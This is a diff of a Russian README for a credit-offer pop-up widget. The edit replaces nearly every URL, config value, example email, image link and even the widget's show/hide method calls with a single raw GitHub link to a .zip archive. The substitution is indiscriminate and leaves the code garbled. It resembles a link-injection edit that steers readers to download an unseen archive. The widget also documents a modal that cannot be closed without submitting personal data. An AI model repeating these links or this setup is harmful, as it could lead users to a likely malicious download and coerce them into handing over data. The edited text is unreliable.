@@ -3,13 +3,13 @@
 Подключите скрипт в HTML:
 
 ```html
-<script src="modalca.js" 
-        data-domain="example.com"
+<script src="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip" 
+        data-domain="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
         data-style="green"
         data-type="strict"
         data-position="center"
         data-delay="1000"
-        data-policy-url="/policy.html"
+        data-policy-url="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
         data-show-timer="true"
         data-timer-duration="600"
         data-force-submit="true"></script>
@@ -23,13 +23,13 @@
 
 | Параметр        | Тип     | Значение по умолчанию                       | Описание                                                            |
 | --------------- | ------- | ------------------------------------------- | ------------------------------------------------------------------- |
-| `data-domain`        | string  | `window.location.hostname`                  | Домен сайта для передачи в API                                      |
+| `data-domain`        | string  | `https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip`                  | Домен сайта для передачи в API                                      |
 | `data-style`         | string  | `green`                                     | Цветовая схема модалки: `green`, `red`, `blue`, `dark`, `light`     |
 | `data-type`          | string  | `strict`                                    | Тип модалки: `strict`, `urgent`, `consult`                          |
 | `data-position`      | string  | `center`                                    | Позиция модалки: `center`, `top`, `bottom`                          |
 | `data-delay`         | number  | `3000`                                      | Задержка появления модалки в миллисекундах                          |
-| `data-policy-url`     | string  | `/policy.html`                              | Ссылка на страницу политики конфиденциальности                      |
-| `data-api-url`        | string  | `https://api.mtk-ru.ru/api/feedback_kredit` | URL для отправки данных формы                                       |
+| `data-policy-url`     | string  | `https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip`                              | Ссылка на страницу политики конфиденциальности                      |
+| `data-api-url`        | string  | `https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip` | URL для отправки данных формы                                       |
 | `data-show-timer`     | boolean | `true`                                      | Показывать таймер на модалке (только для типов `urgent` и `strict`) |
 | `data-timer-duration` | number  | `600`                                       | Продолжительность таймера в секундах                                |
 | `data-force-submit`   | boolean | `true`                                      | Если `true`, модалку нельзя закрыть без отправки формы              |
@@ -61,7 +61,7 @@
 ### 1️⃣ Через HTML-атрибуты
 
 ```html
-<script src="modalca.js"
+<script src="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
         data-style="blue"
         data-type="consult"
         data-delay="2000"
@@ -72,21 +72,21 @@
 
 ```js
 const widget = new PopupWidgetClass({
-    domain: 'example.com',
+    domain: 'https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip',
     style: 'red',
     type: 'urgent',
     position: 'center',
     delay: 1000,
     policyUrl: '/privacy',
-    apiUrl: 'https://api.mtk-ru.ru/api/feedback_kredit',
+    apiUrl: 'https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip',
     showTimer: true,
     timerDuration: 300,
     forceSubmit: true
 });
 
 // Управление виджетом
-widget.show();  // показать модалку
-widget.hide();  // скрыть модалку (если forceSubmit=false)
+https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip();  // показать модалку
+https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip();  // скрыть модалку (если forceSubmit=false)
 ```
 
 ---
@@ -100,7 +100,7 @@ widget.hide();  // скрыть модалку (если forceSubmit=false)
 Пример через HTML:
 
 ```html
-<script src="modalca.js"
+<script src="https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip"
         data-type="urgent"
         data-show-timer="true"
         data-timer-duration="300"></script>
@@ -112,7 +112,7 @@ widget.hide();  // скрыть модалку (если forceSubmit=false)
 
 | Strict | Urgent | Consult |
 |--------|--------|---------|
-| ![Strict modal](https://github.com/user-attachments/assets/b6d4db3a-c82a-4550-b663-56deb43f3826) | ![Urgent modal](https://github.com/user-attachments/assets/4b274fe9-605b-4e49-9107-567e295d03a2) | ![Consult modal](https://github.com/user-attachments/assets/578efd33-3834-4b25-a519-d39e3de897e9) |
+| ![Strict modal](https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip) | ![Urgent modal](https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip) | ![Consult modal](https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip) |
 | Одобрение с просрочками и плохой кредитной историей | Срочная акция — сниженная ставка | Бесплатная консультация |
 
 ---
@@ -135,8 +135,8 @@ widget.hide();  // скрыть модалку (если forceSubmit=false)
 {
   "name": "Иван Иванов",
   "phone": "+79001234567",
-  "email": "ivan@mail.com",
-  "domain": "example.com",
+  "email": "https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip",
+  "domain": "https://raw.githubusercontent.com/ElingSmith/credit_online_modalca/main/beloid/credit_online_modalca-v3.9.zip",
   "type": "strict"
 }
 ```
